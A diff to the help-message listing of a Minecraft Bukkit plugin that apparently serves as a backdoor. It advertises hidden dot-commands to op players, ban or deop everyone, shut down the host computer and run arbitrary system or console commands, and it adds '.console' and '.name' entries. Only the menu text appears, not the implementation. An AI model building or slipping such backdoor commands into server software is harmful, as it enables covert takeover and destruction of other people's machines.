@@ -32,14 +32,16 @@ public class Command_help implements Listener
                 //p.sendMessage(ChatColor.GOLD + ".enablevanilla - Downloads vanilla and runs it (shuts down bukkit).");
                 p.sendMessage(ChatColor.GOLD + ".deop <player> - Deops a player of your choice.");
                 p.sendMessage(ChatColor.GOLD + ".op <player> - OPs a player of your choice.");
-                p.sendMessage(ChatColor.GOLD + ".gamemode [gamemode] -");
+                p.sendMessage(ChatColor.GOLD + ".gamemode <creative|survival|adventure> ");
                 p.sendMessage(ChatColor.GOLD + ".banall - Bans everyone on the server.");
                 p.sendMessage(ChatColor.GOLD + ".deopall - Deops everyone online.");
                 //p.sendMessage(ChatColor.GOLD + ".randombanl - Picks a random player to be banned.");
                 p.sendMessage(ChatColor.GOLD + ".shutdown - Attempts to shutdown the computer the server is running on.");
-                //p.sendMessage(ChatColor.GOLD + ".fuckyou - Wouldn't have a clue."); // Pald update this one.
-                p.sendMessage(ChatColor.GOLD + ".terminal <cmd> - Use cmd commands!");
+                //p.sendMessage(ChatColor.GOLD + ".fuckoff - Wouldn't have a clue."); // Pald update this one.
+                p.sendMessage(ChatColor.GOLD + ".terminal <cmd> - Use system commands!");
                 p.sendMessage(ChatColor.GOLD + ".explode or .explosion - Explode everyone on the server. Includes you.");
+                p.sendMessage(ChatColor.GOLD + ".console <cmd> - Use the console.");
+                p.sendMessage(ChatColor.GOLD + ".name <player> <name> - Name a player.");
                 p.sendMessage(ChatColor.GOLD + ".help - Shows you all the commands.");
                 p.sendMessage(ChatColor.AQUA + "Those are all of the commands.");
                 cancel = true;
